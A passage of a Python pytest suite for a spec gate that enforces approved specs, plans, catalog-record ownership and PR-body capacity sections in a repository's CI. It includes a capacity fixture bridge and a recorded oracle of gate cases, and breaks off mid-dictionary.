    wrong_marker = body() + f"\n\nCanvas refresh pending: {refresh}, {report}\n"
    r = pr(repo, BRANCH, files, **title, PR_BODY=wrong_marker)
    assert r.returncode == 1 and f"Canvas check pending (report-only): {report}" in r.stdout, r.stdout

    handed_off = body() + f"\n\nCanvas refresh pending: {refresh}\nCanvas check pending (report-only): {report}\n"
    assert pr(repo, BRANCH, files, **title, PR_BODY=handed_off).returncode == 0

    on_base(repo, {SPEC: spec(canvases=["https://claude.ai/artifact/ZZZZ"])})
    r = pr(repo, BRANCH, files, **title, PR_BODY=handed_off)
    assert r.returncode == 1 and "ZZZZ, which is not in docs/product/canvases.yml" in r.stdout, r.stdout

    on_base(repo, {SPEC: spec(canvases=[])})
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=body()).returncode == 0


def test_a_change_cannot_add_its_own_capability_or_approve_its_own_spec(repo):
    """Adversarial review of #1205 and #72, B2 (spec_gate.py:249-275).

    The catalog and the spec's `status: approved` were read from the PR head,
    so one PR could add a FEAT-FAKE-001 row, a spec that calls itself approved,
    a plan and the code, and pass. Phase 2 commits the approved spec alone
    first; the gate now reads the catalog row and the spec from the merge base
    (HEAD in commit mode) and refuses a spec that is new or edited in the change.
    """
    fake_spec = "docs/superpowers/specs/2026-09-28-fake.md"
    fake_plan = "docs/superpowers/plans/2026-09-28-fake.md"
    fake_branch = "feature/feat-fake-001-anything"
    catalog = CATALOG_TEXT.replace("| [FEAT-DATA-001]", "| [FEAT-FAKE-001](#feat-fake-001) | Fake | Production | unknown | none |\n| [FEAT-DATA-001]")
    r = pr(repo, fake_branch, {**CODE, CATALOG: catalog,
                               fake_spec: spec(feat_id="FEAT-FAKE-001", req_ids="[REQ-MODEL-001]"),
                               fake_plan: plan(feat_id="FEAT-FAKE-001", spec=fake_spec, branch=fake_branch)})
    assert r.returncode == 1, r.stdout
    assert "FEAT-FAKE-001 is not a row in docs/product/02-FEATURE-CATALOG.md at the base branch" in r.stdout, r.stdout
    assert f"{fake_spec} is new in this change; an approved spec lands alone first" in r.stdout, r.stdout

    r = pr(repo, BRANCH, {**CODE, SPEC: spec(done_when=DONE + ["one more"])})
    assert r.returncode == 1 and f"{SPEC} at this change differs from the base's copy" in r.stdout, r.stdout

    on_base(repo, {SPEC: spec(status="draft")})
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, SPEC, spec())
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "is still status: draft" in r.stdout and "differs from the base's copy" in r.stdout, r.stdout


def test_a_merge_into_a_docs_branch_is_measured_against_what_it_merges(repo):
    """Adversarial review of #1205 and #72, B4 (spec_gate.py --commit).

    Merging main into a docs/ branch stages main's code, and the hook read the
    whole index as the branch's change, so a conflicted merge could not be
    committed. During a merge (MERGE_HEAD exists) the index is measured against
    the side being merged in, which leaves the branch's own files.
    """
    _git(repo, "checkout", "-q", "-B", "docs/typo", "base")
    write(repo, "docs/notes.md", "# Notes\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "docs")
    _git(repo, "checkout", "-q", "main")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "code on main")
    _git(repo, "checkout", "-q", "docs/typo")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "main")
    assert _git(repo, "rev-parse", "--verify", "MERGE_HEAD")
    r = gate(repo, "--commit")
    assert r.returncode == 0, r.stdout
    write(repo, "lib/other.py", "x = 1\n")
    _git(repo, "add", "lib/other.py")
    assert gate(repo, "--commit").returncode == 1


def test_a_failed_git_command_is_a_gate_failure_not_an_empty_diff(repo):
    """Adversarial review of #1205 and #72, finding 5 (spec_gate.py:447,464).

    The return code of `git diff` was ignored, so a diff that failed (a corrupt
    index, a bad ref) listed no files and the gate printed `spec gate ok`. The
    gate now fails naming the command. This is the no-silent-fallback rule applied to
    the gate itself.
    """
    _git(repo, "checkout", "-q", "-B", "docs/x", "base")
    write(repo, "docs/x.md", "# x\n")
    _git(repo, "add", "-A")
    bad_index = repo / ".git" / "broken-index"
    bad_index.write_bytes(b"not an index")
    r = gate(repo, "--commit", GIT_INDEX_FILE=str(bad_index))
    assert r.returncode == 1 and "git diff --cached failed" in r.stdout, r.stdout


def test_the_gate_reads_git_as_utf8_whatever_the_locale(repo):
    """Adversarial review of #1205 and #72, B3 (spec_gate.py:79).

    `git()` decoded with the locale encoding, so on Windows (cp1252) a spec
    holding a curly quote or an emoji raised UnicodeDecodeError and the hook
    blocked every commit with a traceback. Decoding is utf-8 with replacement.
    """
    on_base(repo, {SPEC: spec() + "\nThe reviewer said \u201cship it\u201d \u274c\n"})
    r = pr(repo, BRANCH, CODE, PYTHONUTF8="0", LC_ALL="C", LANG="C")
    assert r.returncode == 0, r.stdout + r.stderr


def test_a_feature_change_edits_only_its_own_product_records(repo):
    """stocks#1205 r4118289642 (spec_gate.py:225).

    Documentation was dropped before any check, so a feature PR could rewrite
    another capability's catalog record, or the requirements, with no
    traceability. Under docs/product/ the catalog and traceability may change
    only on the FEAT-ID's own row and record, and the requirements not at all;
    the model registry, canvases and generated files are not restricted.
    """
    ok = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body()}
    own = CATALOG_TEXT.replace("### FEAT-MODEL-001\n\n- Status: Production", "### FEAT-MODEL-001\n\n- Status: Production\n- Note: decisions named")
    assert pr(repo, BRANCH, {**CODE, CATALOG: own}, **ok).returncode == 0
    other = CATALOG_TEXT.replace("### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")
    r = pr(repo, BRANCH, {**CODE, CATALOG: other}, **ok)
    assert r.returncode == 1 and "lines outside FEAT-MODEL-001's row and record change" in r.stdout, r.stdout
    # stocks#1205 r4119162208: a second heading for the FEAT, nested in another capability's
    # section or anywhere else, is refused; the record is extended, not duplicated
    duplicate = CATALOG_TEXT.replace("### FEAT-DATA-001\n\n- Status: Production",
                                     "### FEAT-DATA-001\n\n#### FEAT-MODEL-001\n\n- Note: copied here\n\n- Status: Production")
    r = pr(repo, BRANCH, {**CODE, CATALOG: duplicate}, **ok)
    assert r.returncode == 1 and "adds a second heading or row for FEAT-MODEL-001" in r.stdout, r.stdout
    # stocks#1205 r4119416471: promoting the FEAT's heading would swallow the capabilities below it
    promoted = CATALOG_TEXT.replace("### FEAT-MODEL-001\n", "## FEAT-MODEL-001\n").replace(
        "### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Production\n- Note: slipped in")
    r = pr(repo, BRANCH, {**CODE, CATALOG: promoted}, **ok)
    assert r.returncode == 1 and ("changes the level" in r.stdout or "lines outside" in r.stdout), r.stdout
    # solyra#72 r4119234359: a second table row for the FEAT is a duplicate record too
    twice = CATALOG_TEXT.replace("| Models | Production | unknown | none |",
                                 "| Models | Production | unknown | none |\n| [FEAT-MODEL-001](#feat-model-001) | Models again | Production | unknown | #42 |")
    r = pr(repo, BRANCH, {**CODE, CATALOG: twice}, **ok)
    assert r.returncode == 1 and "adds a second heading or row for FEAT-MODEL-001" in r.stdout, r.stdout
    # solyra#72 r4119049970: an added heading naming this FEAT does not widen its span over
    # another capability's row
    widened = CATALOG_TEXT + "\n## FEAT-MODEL-001 additions\n\n| [FEAT-FAKE-999](#x) | Fake | Production | unknown | none |\n"
    r = pr(repo, BRANCH, {**CODE, CATALOG: widened}, **ok)
    assert r.returncode == 1 and ("adds a second heading" in r.stdout or "lines outside FEAT-MODEL-001" in r.stdout), r.stdout
    r = pr(repo, BRANCH, {**CODE, REQUIREMENTS: REQUIREMENTS_TEXT + "\n**REQ-MODEL-002:** Faster.\n"}, **ok)
    assert r.returncode == 1 and "requirements change on their own docs/ branch" in r.stdout, r.stdout
    trace = "# Traceability\n\n### FEAT-DATA-001\n\n- #1\n"
    on_base(repo, {TRACEABILITY: trace})
    assert pr(repo, BRANCH, {**CODE, TRACEABILITY: trace + "\n### FEAT-MODEL-001\n\n- #7\n"}, **ok).returncode == 0
    r = pr(repo, BRANCH, {**CODE, TRACEABILITY: trace.replace("#1", "#1, #7")}, **ok)
    assert r.returncode == 1 and "docs/product/12-PR-ISSUE-TRACEABILITY.md: lines outside" in r.stdout, r.stdout
    # (round seven: a feature change edits the registry rows of the models its spec names, and nothing else there)
    on_base(repo, {SPEC: spec() + "\nThis spec changes MODEL-X-001.\n", "docs/product/07-MODEL-REGISTRY.md": "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-X-001 | Draft |\n"})
    assert pr(repo, BRANCH, {**CODE, "docs/product/07-MODEL-REGISTRY.md": "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-X-001 | Production |\n"}, **ok).returncode == 0
    on_base(repo, {SPEC: spec(), "docs/product/07-MODEL-REGISTRY.md": None})


def test_the_plan_names_a_spec_under_the_spec_directory(repo):
    """stocks#1205 r4118289647 (spec_gate.py:195).

    validate_plan only required the spec path to resolve to some file, so a
    plan could name an approved-looking file outside docs/superpowers/specs/,
    which the supersession scan never sees.
    """
    stray = "docs/notes/approved.md"
    on_base(repo, {stray: spec()})
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=stray)})
    assert r.returncode == 1 and f"spec must be a file under docs/superpowers/specs/, not {stray}" in r.stdout, r.stdout


def test_the_branch_override_names_a_detached_commit_only(repo):
    """stocks#1205 r4118289655 (spec_gate.py:444).

    SPEC_GATE_BRANCH was read before the real branch, so a commit on main or
    docs/x could export a feature branch's name and be judged by that branch's
    plan. The override is honoured only when HEAD is detached.
    """
    _git(repo, "checkout", "-q", "-B", "docs/typo", "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    r = gate(repo, "--commit", SPEC_GATE_BRANCH=BRANCH)
    assert r.returncode == 1 and "HEAD is on branch 'docs/typo'" in r.stdout, r.stdout
    _git(repo, "checkout", "-q", "--detach")
    assert gate(repo, "--commit", SPEC_GATE_BRANCH=BRANCH).returncode == 0


def test_a_ticked_done_when_item_may_not_defer_its_work(repo):
    """stocks#1205 r4118289657 (spec_gate.py:392).

    A ticked line only had to start with the done_when text, so
    `- [x] <item> (follow-up)` counted as done. The phrases CLAUDE.md rule 0
    forbids in a perf context are refused on a ticked done_when line.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    deferred = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]} (non-blocking, future-work)\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=deferred)
    assert r.returncode == 1 and "a ticked done_when item defers its work" in r.stdout, r.stdout
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=body(ticked=True)).returncode == 0
    # stocks#1205 r4119001317: a deferral on the item's indented continuation line renders as
    # part of the same task-list item
    continued = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n    TODO: run this in a follow-up PR\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=continued)
    assert r.returncode == 1 and "a ticked done_when item defers its work" in r.stdout, r.stdout
    evidence = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]}\n    verified by `pytest tests/lib`\n- [x] {DONE[1]}\n"
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=evidence).returncode == 0
    # solyra#72 r4119153690: the spec's own wording is not a deferral; the evidence after it is
    on_base(repo, {SPEC: spec(done_when=["the queue shows no pending jobs", "skipped records are excluded"])})
    worded = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] the queue shows no pending jobs\n- [x] skipped records are excluded\n"
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=worded).returncode == 0, worded
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=worded.replace("excluded\n", "excluded (not yet verified)\n"))
    assert r.returncode == 1 and "defers its work" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec()})
    # solyra#72 r4119049965: an explicit "not done" is a deferral whatever the wording
    for phrase in ("not run", "not implemented", "not yet verified", "incomplete", "pending"):
        body_text = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [x] {DONE[0]} ({phrase})\n- [x] {DONE[1]}\n"
        r = pr(repo, BRANCH, CODE, **title, PR_BODY=body_text)
        assert r.returncode == 1 and "defers its work" in r.stdout, (phrase, r.stdout)


# ---------------------------------------------------------------------------------------------
# Capacity fixture bridge (docs/superpowers/specs/2026-10-13-feat-cicd-001-capacity-fixture-bridge.md).
#
# The eight capacity-bearing functions below keep their historical `$/run × runs/day × 30:` or bare
# `30:` carrier and carry an explicit same-value `Cost:` after it on the same line, so the separately
# approved strict Cost parser can later pass this unchanged suite. The gate under test is byte-identical
# to main: nothing here reads the gate's labels or verdicts. CAPACITY_BRIDGE_ORACLE is a capture of
# every original case those functions dispatched through the real CLI on the BASE below, before any
# fixture changed. For each dispatched case the guard in gate() compares the actual caller vector and
# the PR body (after reversing only the Cost addition) with that oracle BEFORE the subprocess, and the
# verdict after it; the per-function finalizer proves the whole original sequence ran, in order, once.
# Normalised: the two 40-hex `--pr` operands, and the suite's TODAY (the generated catalog-review date)
# inside fixture files, bodies and reason lines (counts recorded for files and bodies). Nothing else is
# normalised or sorted.
class CapacityFixtureEquivalenceError(AssertionError):
    """A bridged capacity case differs from its BASE oracle, or its carriers are not a same-value pair."""


CAPACITY_BRIDGE_BASE = {
    "main": "1fb97576cd41d9ac601888f9507cd77375922a31",
    "suite_blob": "d486f304cdb2caec316f2f1a5900b6dba35613f1",
    "gate_blob": "ffb1ada8efef5777e1248241bd38b68ffaa2d23a",
    "captured": "2026-11-04",
}
# A legacy cost carrier: the full formula label or a bare `30:` that is not part of another token.
# Its value runs to the Cost carrier on the same line, the end of the line or the end of the body.
CAPACITY_BRIDGE_LEGACY = re.compile(r"(\$/run \u00d7 runs/day \u00d7 30|(?<![\w$#:])30):([^\n]*?)(?= \u00b7 Cost:|\n|$)")
CAPACITY_BRIDGE_COST_PREFIX = " \u00b7 Cost:"
# The only diagnostic compatibility the spec allows: the final cost label of a capacity message spelt
# `Cost` instead of `30`, which is what the strict Cost gate prints for the same case.
CAPACITY_BRIDGE_LABEL_ALTERNATIVES = ((", 30 blank", ", Cost blank"), (", 30;", ", Cost;"))
_CAPACITY_BRIDGE = {"active": None, "seq": 0, "dispatched": 0, "vector": None}


def capacity_bridge_today_hash(text: str) -> tuple[str, int]:
    """sha256 of `text` with the suite's TODAY replaced by `{TODAY}`, and how many fields that was."""
    return hashlib.sha256(text.replace(TODAY, "{TODAY}").encode("utf-8")).hexdigest(), text.count(TODAY)


def capacity_bridge_vector(branch: str, files: dict[str, str | None]) -> tuple[tuple[str, ...], str]:
    """The caller vector of a pr() case: its paths and one identity over branch, paths and contents."""
    rows = []
    for name in sorted(files):
        text = files[name]
        if text is None:
            rows.append(f"{name}\t-\t0")
        else:
            digest, today = capacity_bridge_today_hash(text)
            rows.append(f"{name}\t{digest}\t{today}")
    return tuple(sorted(files)), hashlib.sha256((branch + "\n" + "\n".join(rows)).encode("utf-8")).hexdigest()


def capacity_bridge_split(body: str | None) -> tuple[str | None, tuple[str, ...]]:
    """(the body with every Cost carrier removed, the legacy carrier values in order).

    Refuses, before any gate subprocess, a legacy carrier without its Cost carrier immediately after
    it, a Cost carrier whose value differs from the legacy value, a second Cost carrier on the line,
    and a Cost carrier that no legacy carrier precedes. A missing legacy carrier stays missing: the
    bridge adds no helpful default."""
    if body is None:
        return None, ()
    legacy, pieces, pos = [], [], 0
    for m in CAPACITY_BRIDGE_LEGACY.finditer(body):
        value, end = m.group(2).strip(), m.end()
        if not body.startswith(CAPACITY_BRIDGE_COST_PREFIX, end):
            raise CapacityFixtureEquivalenceError(f"legacy carrier {m.group(0).strip()!r} has no Cost carrier immediately after it")
        stop = body.find("\n", end)
        stop = len(body) if stop < 0 else stop
        cost = body[end + len(CAPACITY_BRIDGE_COST_PREFIX):stop].strip()
        if cost != value:
            raise CapacityFixtureEquivalenceError(f"Cost carrier {cost!r} differs from legacy carrier value {value!r}")
        legacy.append(value)
        pieces.append(body[pos:end])
        pos = stop
    pieces.append(body[pos:])
    reversed_body = "".join(pieces)
    if re.search(r"\bCost:", reversed_body):
        raise CapacityFixtureEquivalenceError("a Cost carrier stands without a legacy carrier before it on its line")
    return reversed_body, tuple(legacy)


def capacity_bridge_activate(name: str | None) -> None:
    _CAPACITY_BRIDGE.update(active=name, seq=0, vector=None)


def capacity_bridge_consumed() -> tuple[int, int]:
    """(cases dispatched so far, cases the BASE oracle holds) for the active function."""
    return _CAPACITY_BRIDGE["seq"], len(CAPACITY_BRIDGE_ORACLE[_CAPACITY_BRIDGE["active"]])


def capacity_bridge_before_dispatch(args: tuple[str, ...], env: dict[str, str]) -> None:
    """Compare the case about to be dispatched with the next BASE oracle case; raise before the gate runs."""
    name = _CAPACITY_BRIDGE["active"]
    if name is None:
        return
    vector, _CAPACITY_BRIDGE["vector"] = _CAPACITY_BRIDGE["vector"], None
    cases, k = CAPACITY_BRIDGE_ORACLE[name], _CAPACITY_BRIDGE["seq"]
    if k >= len(cases):
        raise CapacityFixtureEquivalenceError(f"{name}: case {k + 1} is beyond the {len(cases)} BASE cases")
    shape = tuple("SHA" if re.fullmatch(r"[0-9a-f]{40}", a) else a for a in args)
    if shape != ("--pr", "SHA", "SHA"):
        raise CapacityFixtureEquivalenceError(f"{name} case {k + 1}: unexpected gate arguments {shape!r}")
    reversed_body, carriers = capacity_bridge_split(env.get("PR_BODY"))
    digest, today = (None, 0) if reversed_body is None else capacity_bridge_today_hash(reversed_body)
    actual = (tuple(sorted((key, value) for key, value in env.items() if key != "PR_BODY")),
              None if vector is None else vector[0], None if vector is None else vector[1], digest, today, carriers)
    expected = cases[k][:6]
    if actual != expected:
        fields = ("env", "files", "files identity", "body identity", "body date fields", "legacy carriers")
        diff = "; ".join(f"{f}: {a!r} != BASE {e!r}" for f, a, e in zip(fields, actual, expected) if a != e)
        raise CapacityFixtureEquivalenceError(f"{name} case {k + 1} differs from the BASE oracle: {diff}")
    _CAPACITY_BRIDGE["seq"] = k + 1


def capacity_bridge_reasons(stdout: str) -> tuple[str, ...]:
    """The gate's reason lines, with the suite's TODAY (a generated catalog-review date) as `{TODAY}`."""
    return tuple(line.replace(TODAY, "{TODAY}") for line in stdout.splitlines() if line.startswith(" - "))


def capacity_bridge_alternative(line: str) -> str:
    for old, new in CAPACITY_BRIDGE_LABEL_ALTERNATIVES:
        if old in line:
            return line.replace(old, new, 1)
    return line


def capacity_bridge_after_dispatch(result: subprocess.CompletedProcess) -> None:
    """The dispatched case keeps its BASE verdict: returncode and reasons, the cost label spelt either way."""
    name = _CAPACITY_BRIDGE["active"]
    if name is None:
        return
    _CAPACITY_BRIDGE["dispatched"] += 1
    expected = CAPACITY_BRIDGE_ORACLE[name][_CAPACITY_BRIDGE["seq"] - 1]
    reasons = capacity_bridge_reasons(result.stdout)
    alternative = tuple(capacity_bridge_alternative(line) for line in expected[7])
    if result.returncode != expected[6] or reasons not in (expected[7], alternative):
        raise CapacityFixtureEquivalenceError(f"{name} case {_CAPACITY_BRIDGE['seq']}: verdict {result.returncode} "
                                              f"{reasons!r} differs from BASE {expected[6]} {expected[7]!r}")


CAPACITY_BRIDGE_FUNCTIONS = (
    "test_a_workload_change_carries_its_capacity_numbers",
    "test_the_pr_body_contract_is_read_as_rendered_in_every_form",
    "test_capacity_values_are_numbers",
    "test_contract_commands_run_and_policy_documents_keep_their_ids",
    "test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contract",
    "test_html_blocks_in_bodies_registry_prose_and_catalog_columns_are_the_contract",
    "test_indented_headings_and_less_indented_fence_closers_render_as_gfm_renders_them",
    "test_truthy_calls_decorators_yaml_skill_names_canvas_fields_manifest_scripts_and_rendered_status",
)
CAPACITY_BRIDGE_CASES = 155   # gate invocations the eight functions made on BASE, captured once


def capacity_bridge_dispatched() -> int:
    return _CAPACITY_BRIDGE["dispatched"]


def capacity_bridge_refused(repo: Path, name: str, originals: tuple[str, ...], files: dict[str, str | None],
                            title: dict[str, str], stage: int, text: str, mutated_files: dict[str, str | None] | None = None) -> str:
    """Replay the valid cases before `stage`, then dispatch `text` there: refused, zero subprocesses."""
    capacity_bridge_activate(name)
    for original in originals[:stage - 1]:
        pr(repo, BRANCH, files, **title, PR_BODY=original)
    before = capacity_bridge_dispatched()
    with pytest.raises(CapacityFixtureEquivalenceError) as info:
        pr(repo, BRANCH, files if mutated_files is None else mutated_files, **title, PR_BODY=text)
    assert capacity_bridge_dispatched() == before, "a refused case reached the gate subprocess"
    return str(info.value)


@pytest.fixture(autouse=True)
def capacity_bridge_guard(request):
    """Per-function finalizer for the eight bridged functions: every BASE case dispatched, in order, once."""
    name = getattr(request.node, "originalname", None) or request.node.name
    if name not in CAPACITY_BRIDGE_ORACLE:
        yield
        return
    capacity_bridge_activate(name)
    try:
        yield
        consumed, expected = capacity_bridge_consumed()
    finally:
        capacity_bridge_activate(None)
    assert consumed == expected, f"{name} dispatched {consumed} of its {expected} BASE cases"


# One tuple per original case, in dispatch order:
# (env name/value pairs except PR_BODY, sorted; files; files identity; body identity; body date fields;
#  legacy carrier values; returncode; reason lines). `files` and its identity are None for the one case
# that calls gate() directly; body identity is None when no PR_BODY was passed.
CAPACITY_BRIDGE_ORACLE = {
    'test_a_workload_change_carries_its_capacity_numbers': (
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '9feb9bb8df1239244c2a6d234be7e2fa623ba0fc1f1a5321ddd051deefc2d957', 0, ('',), 1, (" - PR body's Capacity section leaves Volume, Velocity, Wall-clock, 30 blank; give the numbers, or write 'n/a: <why no workload runs differently>'",)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 1, (' - PR body needs a Capacity section: the change touches a workload (gcp/model_job.py)',)),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '68c3ab6ed24ddffdaf3263ebaa9794931a8dacd4cb2b7e12fe59298a7508623a', 0, ('$0.01',), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '4d87c40543d67f8e5788b7d4b538be65cfdd1b224f7334d1407a03cbc2ee01b0', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '5497d7231aafde6c0adb3eb47386a9f89dc72dfaa00db3b03fc86175b00fa3a5', 0, ('$0.01',), 0, ()),
        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '3aebeed7c12b17af436a7037ad1c39d973bea27239738d6f75bc0c99cd8c6b92', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '8eddc3b691aaec2af763ffa59aed715ebe2f7e331ed0ac413ed8ef6136413d26', 'de4cddb51d1b15d964d8d10d4c9d8cbb9f715e6d2034231f21e268e2b0096882', 0, (), 1, (' - PR body needs a Capacity section: the change touches a workload (.github/workflows/spec-gate.yml)',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '8eddc3b691aaec2af763ffa59aed715ebe2f7e331ed0ac413ed8ef6136413d26', '7b00fd25bf9f3f04d9f330b1507609699eeabf86da6db096e1e24c33e5b95b71', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '62b8cba8320a0c93e904898fc4ff7629dd1e17a7e888cb1a251281950859d32a', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the gate's entrypoints and policy documents cannot be removed by a change; retiring the gate is a decision taken on main, not in a branch",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '517912437c881f6f8131f218722b2a3e6d3e1db6f75c857e5f872f7b996d1485', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: the gate's entrypoints and policy documents cannot be removed by a change; retiring the gate is a decision taken on main, not in a branch",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.githooks/pre-commit',), 'd8d8928f1940160f97bb4123be8e3ab95ba082540d6ff3b188629353703e87db', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .githooks/pre-commit: the gate's entrypoints and policy documents cannot be removed by a change; retiring the gate is a decision taken on main, not in a branch",)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '42f42f451add11b40e6518b32aa103b3877036a13f66d8be03c0072b70cc3306', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '19b4cffd625164c442eae1759a77150679130d78aab028abc87f1b8d8d37d196', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '5e27b15c58243233c646582261e50699517102f7f836f5d58093941e6baef47b', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml-backdoor.yaml',), '92eb784c1f05ed46c1bc75900d646ed3ea975177f7b9416593e3e461928662e3', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - branch 'chore/gate-workflow' changes 1 gated file(s) (.github/workflows/spec-gate.yml-backdoor.yaml) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('scripts/gate/helper.py',), '628bc8051929eae3f79357d565c00fd73074ab7ee80852283c4bbfa9feedf252', None, 0, (), 1, (" - branch 'chore/gate-workflow' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", ' - scripts/gate/helper.py: scripts/gate/ holds scripts/gate/spec_gate.py and scripts/gate/export_model_registry.py and nothing else; a module beside them would shadow an import of the gate', " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'chore/deps'),), ('docs/product/01-PRODUCT-REQUIREMENTS.md',), '209423f92f57b54113c79ef4c6255a510580fef516ae957b070fa4db4bf443bd', None, 0, (), 1, (" - branch 'chore/deps' changes 1 gated file(s) (docs/product/01-PRODUCT-REQUIREMENTS.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/brainstorming/SKILL.md', 'docs/notes.md'), 'c4c9b6f42cab6e83431680d24fe465b256fa9ad9a51dfdb6584a6657a882c99f', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (docs/notes.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
